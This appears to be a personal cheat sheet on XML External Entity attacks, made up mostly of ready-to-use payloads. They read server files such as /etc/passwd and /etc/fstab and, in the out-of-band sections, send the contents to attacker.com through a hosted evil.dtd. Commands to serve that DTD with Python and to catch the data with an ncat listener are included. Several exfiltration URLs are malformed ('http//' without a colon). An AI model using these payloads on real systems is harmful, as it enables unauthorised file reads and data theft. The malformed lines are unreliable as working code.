# Notes on XXE (XML External Entities)

## What it is

A type of server side request forgery (SSRF) attack where a request is made to an arbitrary URI when parsing a modified XML file on the server side. To find these vulnerabilities look for post requests which include xml files with entities declared.

XML is used in APIs, PDFs, SVGs, Office documents, etc.


Types of XXE:
- Inband (output/result is rendered in the browser)
- Error based (only errors become visible)
- Out of band (blind XXE where XML is parsed but the output is completely hidden)

---

## What it looks like

The DTD (document type definition) is defined above the root element "Pwn" in the XML document.

```xml
<?xml version="1.0"?>
<!DOCTYPE Pwn [
    <!ENTITY subscribe SYSTEM "secret.txt">
]>
<Pwn>&subscribe;</Pwn>
```
Change the value "secret.txt" to any URI and see what happens (file, http, ftp...)

"/etc/passwd" is a good candidate.

---

## Out of band XXE

If the server doesn't output anything in response to an XXE attack, try pointing it to your own server and see if a request comes through.

Exfiltrating Out of bound XXE example:

xxe.xml
```xml
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://attacker.com:8080/evil.dtd">
<foo>&send;</foo>
```

evil.dtd
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http//attacker.com:1337/?%file;'>">
%all;
```

Host the evil.dtd

```bash
# in the dir where evil.dtd is
$ python -m SimpleHTTPServer 8080
$ python3 -m http.server 8080
```

Listen for the post request containing the file

```bash
$ ncat -klvp 1337
```

---

## Files with comments etc.

Some files which include # comments could break the XML syntax when fetched. The CDATA is there to ensure that this doesn't happen.

xxe.xml
```xml
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://attacker.com:8080/evil.dtd">
<foo>&send;</foo>
```

cdata.dtd
```xml
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % wrapper "<!ENTITY all '%start;%file;%end;'>">
<!ENTITY % pwnent "<!ENTITY send SYSTEM 'http//attacker.com:1337/?%wrapper;'>">
%pwnent;
```

---